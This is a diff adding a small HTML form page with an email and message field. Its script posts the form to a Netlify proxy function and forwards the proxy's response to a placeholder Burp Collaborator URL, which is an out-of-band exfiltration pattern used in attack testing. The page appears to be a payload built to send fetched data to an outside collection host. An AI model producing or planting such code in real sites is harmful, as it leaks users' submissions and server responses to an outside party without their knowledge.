@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form Submission</title>
+<script>
+function submitForm() {
+    var form = document.getElementById("myForm");
+    var formData = new FormData(form);
+    
+    fetch('/.netlify/functions/proxy', { // Proxy URL provided by Netlify
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(data => {
+        // Send response data to Burp Collaborator
+        sendToBurpCollaborator(data);
+    })
+    .catch(error => console.error('Error:', error));
+}
+
+function sendToBurpCollaborator(data) {
+    // Replace 'YOUR_BURP_COLLABORATOR_URL' with your actual Burp Collaborator URL
+    var burpCollaboratorUrl = 'YOUR_BURP_COLLABORATOR_URL';
+    
+    // Send data to Burp Collaborator
+    fetch(burpCollaboratorUrl, {
+        method: 'POST',
+        body: data
+    })
+    .then(response => console.log('Data sent to Burp Collaborator:', data))
+    .catch(error => console.error('Error sending data to Burp Collaborator:', error));
+}
+</script>
+</head>
+<body>
+<form id="myForm" onsubmit="submitForm(); return false;">
+    <!-- Your form fields go here -->
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email"><br><br>
+    <label for="message">Message:</label>
+    <textarea id="message" name="message"></textarea><br><br>
+    <input type="submit" value="Submit">
+</form>
+</body>
+</html>
